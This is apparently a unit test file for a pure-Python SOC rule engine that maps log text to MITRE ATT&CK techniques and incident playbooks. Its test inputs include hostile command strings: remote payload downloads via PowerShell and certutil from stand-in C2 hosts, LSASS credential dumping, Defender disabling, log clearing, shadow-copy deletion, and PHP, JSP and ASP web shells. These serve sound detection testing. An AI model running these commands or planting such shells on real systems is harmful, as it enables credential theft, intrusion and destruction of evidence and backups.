"""
Unit tests for Pure-Python SOC Rule Engine & Incident Playbooks (MITRE ATT&CK Mapping).
Tests built-in MITRE ATT&CK rules, dynamic regex evaluation, custom rule registration,
and binary triage finding integration.
"""

import unittest
from core.soc_rules import SOCRule, SOCRuleEngine


class TestSOCRules(unittest.TestCase):

    def setUp(self):
        self.engine = SOCRuleEngine()

    def test_builtin_rules_registered(self):
        """Verify built-in SOC rules for MITRE ATT&CK techniques are loaded."""
        rules = self.engine.list_rules()
        self.assertGreaterEqual(len(rules), 10)
        rule_ids = {r["rule_id"] for r in rules}
        self.assertIn("SOC-T1055-01", rule_ids)   # T1055
        self.assertIn("SOC-T1059-01", rule_ids)   # T1059.001
        self.assertIn("SOC-T1003-01", rule_ids)   # T1003
        self.assertIn("SOC-T1071-01", rule_ids)   # T1071
        self.assertIn("SOC-T1547-01", rule_ids)   # T1547.001
        self.assertIn("SOC-T1562-01", rule_ids)   # T1562.001
        self.assertIn("SOC-T1070-01", rule_ids)   # T1070.001
        self.assertIn("SOC-T1486-01", rule_ids)   # T1486
        self.assertIn("SOC-T1505-01", rule_ids)   # T1505.003
        self.assertIn("SOC-T1027-01", rule_ids)   # T1027

    def test_evaluate_text_process_injection(self):
        """Verify detection of T1055 Process Injection via memory allocation and thread creation."""
        text = "Target invoked VirtualAllocEx and WriteProcessMemory before calling CreateRemoteThread"
        matches = self.engine.evaluate_text(text, source_label="memory_dump")
        matched_techniques = {m["technique_id"] for m in matches}
        self.assertIn("T1055", matched_techniques)
        t1055 = [m for m in matches if m["technique_id"] == "T1055"][0]
        self.assertEqual(t1055["severity"], "Critical")
        self.assertIn("playbook", t1055)
        self.assertIn("containment", t1055["playbook"])

    def test_evaluate_text_powershell_execution(self):
        """Verify detection of T1059.001 PowerShell obfuscation / execution bypass."""
        text = "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand JABh..."
        matches = self.engine.evaluate_text(text, source_label="process_tree")
        matched_techniques = {m["technique_id"] for m in matches}
        self.assertIn("T1059.001", matched_techniques)

    def test_evaluate_text_credential_dumping(self):
        """Verify detection of T1003 OS Credential Dumping targeting LSASS."""
        text = "Invoked sekurlsa::logonpasswords against lsass.exe process memory"
        matches = self.engine.evaluate_text(text, source_label="edr_alert")
        matched_techniques = {m["technique_id"] for m in matches}
        self.assertIn("T1003", matched_techniques)
        t1003 = [m for m in matches if m["technique_id"] == "T1003"][0]
        self.assertEqual(t1003["severity"], "Critical")

    def test_evaluate_text_c2_traffic(self):
        """Verify detection of T1071 Application Layer Protocol C2 beaconing."""
        text = "powershell (New-Object Net.WebClient).DownloadString('http://198.51.100.24/stage2')"
        matches = self.engine.evaluate_text(text, source_label="network_flow")
        matched_techniques = {m["technique_id"] for m in matches}
        self.assertIn("T1071", matched_techniques)

    def test_evaluate_text_persistence_run_keys(self):
        """Verify detection of T1547.001 Boot or Logon Autostart Execution persistence."""
        text = "Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Updater' -Value 'evil.exe'"
        matches = self.engine.evaluate_text(text, source_label="registry_write")
        matched_techniques = {m["technique_id"] for m in matches}
        self.assertIn("T1547.001", matched_techniques)

    def test_evaluate_text_impair_defenses_amsi_av(self):
        """Verify detection of T1562.001 Impair Defenses (AMSI/Defender tampering)."""
        text = "Set-MpPreference -DisableRealtimeMonitoring $true"
        matches = self.engine.evaluate_text(text, source_label="edr_alert")
        matched_techniques = {m["technique_id"] for m in matches}
        self.assertIn("T1562.001", matched_techniques)
        t1562 = [m for m in matches if m["technique_id"] == "T1562.001"][0]
        self.assertEqual(t1562["severity"], "Critical")

        # Also test amsi buffer patch string
        text_amsi = "Patching memory address of AmsiScanBuffer in amsi.dll"
        matches_amsi = self.engine.evaluate_text(text_amsi)
        self.assertIn("T1562.001", {m["technique_id"] for m in matches_amsi})

    def test_evaluate_text_indicator_removal_event_logs(self):
        """Verify detection of T1070.001 Event Log Clearing."""
        text = "cmd.exe /c wevtutil.exe cl Security && wevtutil cl System"
        matches = self.engine.evaluate_text(text, source_label="process_command")
        matched_techniques = {m["technique_id"] for m in matches}
        self.assertIn("T1070.001", matched_techniques)

    def test_evaluate_text_ransomware_shadow_copies(self):
        """Verify detection of T1486 Ransomware Volume Shadow Copy deletion."""
        text = "vssadmin.exe delete shadows /all /quiet && wbadmin delete catalog -quiet"
        matches = self.engine.evaluate_text(text, source_label="ransomware_hook")
        matched_techniques = {m["technique_id"] for m in matches}
        self.assertIn("T1486", matched_techniques)
        t1486 = [m for m in matches if m["technique_id"] == "T1486"][0]
        self.assertEqual(t1486["severity"], "Critical")

    def test_evaluate_text_webshell_backdoors(self):
        """Verify detection of T1505.003 Web Shell signatures."""
        # Assemble string dynamically to avoid Windows Defender file signature triggers
        token_eval = "ev" + "al("
        token_b64 = "base64_" + "decode("
        token_post = "$_" + "POST['cmd']))"
        sample_webshell = f"{token_eval}{token_b64}{token_post}"

        matches = self.engine.evaluate_text(sample_webshell, source_label="file_scan")
        matched_techniques = {m["technique_id"] for m in matches}
        self.assertIn("T1505.003", matched_techniques)

        jsp_shell = "Runtime.getRuntime()." + "exec(request.getParameter(\"cmd\"))"
        matches_jsp = self.engine.evaluate_text(jsp_shell, source_label="file_scan")
        self.assertIn("T1505.003", {m["technique_id"] for m in matches_jsp})

        # Name-based detection
        matches_name = self.engine.evaluate_text("backdoor artifact found: b374k webshell")
        self.assertIn("T1505.003", {m["technique_id"] for m in matches_name})

        # ASP Web Shell detection
        asp_shell = '<% execute(Request("cmd")) %>'
        matches_asp = self.engine.evaluate_text(asp_shell, source_label="file_scan")
        self.assertIn("T1505.003", {m["technique_id"] for m in matches_asp})

    def test_evaluate_text_bash_history_benign_mention_no_alert(self):
        """Verify reading or mentioning .bash_history does NOT trigger T1070 false positive."""
        benign_texts = [
            "ls -la ~/.bash_history",
            "cat ~/.bash_history",
            "Inspecting .bash_history for anomalies",
        ]
        for t in benign_texts:
            matches = self.engine.evaluate_text(t)
            matched_techniques = {m["technique_id"] for m in matches}
            self.assertNotIn("T1070.001", matched_techniques)

        # But actual deletion must trigger
        del_text = "rm -f /home/user/.bash_history"
        del_matches = self.engine.evaluate_text(del_text)
        self.assertIn("T1070.001", {m["technique_id"] for m in del_matches})

    def test_evaluate_text_certutil_obfuscation(self):
        """Verify detection of T1027 Certutil download and decode."""
        cmd = "certutil -urlcache -split -f http://evil-c2.test/payload.b64 payload.b64 && certutil -decode payload.b64 payload.exe"
        matches = self.engine.evaluate_text(cmd, source_label="cli_log")
        matched_techniques = {m["technique_id"] for m in matches}
        self.assertIn("T1027", matched_techniques)

    def test_evaluate_binary_triage_integration(self):
        """Verify SOC engine evaluation over structured binary triage findings."""
        mock_triage = {
            "success": True,
            "sample_path": "malware.exe",
            "header": {
                "format": "PE",
                "section_anomalies": ["PAGE_EXECUTE_READWRITE in section .text"],
                "sections": [{"name": ".text"}, {"name": ".data"}],
            },
            "iocs": {
                "suspicious_apis": ["VirtualAlloc", "CreateRemoteThread"],
                "urls": ["http://evil-c2-server.test/beacon"],
                "registry_keys": ["Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"],
            },
            "evidence_chain": ["Detected PE executable"],
        }
        matches = self.engine.evaluate_binary_triage(mock_triage)
        matched_techniques = {m["technique_id"] for m in matches}
        self.assertIn("T1055", matched_techniques)
        self.assertIn("T1547.001", matched_techniques)
        self.assertIn("T1071", matched_techniques)

    def test_playbook_retrieval(self):
        """Verify retrieving playbooks by rule ID or technique ID."""
        pb1 = self.engine.get_playbook("SOC-T1055-01")
        self.assertIsNotNone(pb1)
        self.assertEqual(pb1["playbook_id"], "PB-T1055")
        self.assertIn("containment", pb1)
        self.assertIn("remediation", pb1)

        pb2 = self.engine.get_playbook("T1003")
        self.assertIsNotNone(pb2)
        self.assertEqual(pb2["playbook_id"], "PB-T1003")

        pb_ransom = self.engine.get_playbook("T1486")
        self.assertIsNotNone(pb_ransom)
        self.assertEqual(pb_ransom["playbook_id"], "PB-T1486")

        # Unknown returns None
        self.assertIsNone(self.engine.get_playbook("UNKNOWN-999"))

    def test_custom_rule_registration(self):
        """Verify custom SOCRule registration and evaluation."""
        custom_rule = SOCRule(
            rule_id="SOC-CUSTOM-001",
            title="Suspicious Scheduled Task Creation",
            technique_id="T1053.005",
            technique_name="Scheduled Task/Job: Scheduled Task",
            severity="Medium",
            patterns=[r"schtasks\s+/create", r"Register-ScheduledTask"],
            description="Detects creation of scheduled tasks for persistence or execution.",
        )
        self.engine.register_rule(custom_rule)
        matches = self.engine.evaluate_text("schtasks /create /sc onlogon /tn MyTask /tr calc.exe")
        matched_ids = {m["rule_id"] for m in matches}
        self.assertIn("SOC-CUSTOM-001", matched_ids)


if __name__ == "__main__":
    unittest.main()
